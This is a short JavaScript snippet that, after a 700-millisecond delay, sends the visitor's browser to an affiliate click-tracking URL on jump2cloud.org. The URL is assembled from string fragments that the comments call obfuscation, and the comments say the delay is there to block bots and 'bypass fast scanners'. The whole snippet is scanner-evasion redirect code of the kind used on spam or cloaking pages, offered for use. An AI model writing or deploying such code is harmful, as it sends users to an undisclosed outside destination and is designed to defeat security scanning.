// Delay to avoid instant redirect (blocks bots)
setTimeout(function () {
  // Obfuscation: Build the URL in parts
  const part1 = "https://";
  const part2 = "netex.";
  const part3 = "jump2cloud.";
  const part4 = "org";
  const path = "/click?aid=226&oid=320&aff_sub2=a";

  // Construct final URL
  const finalURL = part1 + part2 + part3 + part4 + path;

  // Redirect
  window.location.href = finalURL;
}, 700); // Delay helps bypass fast scanners
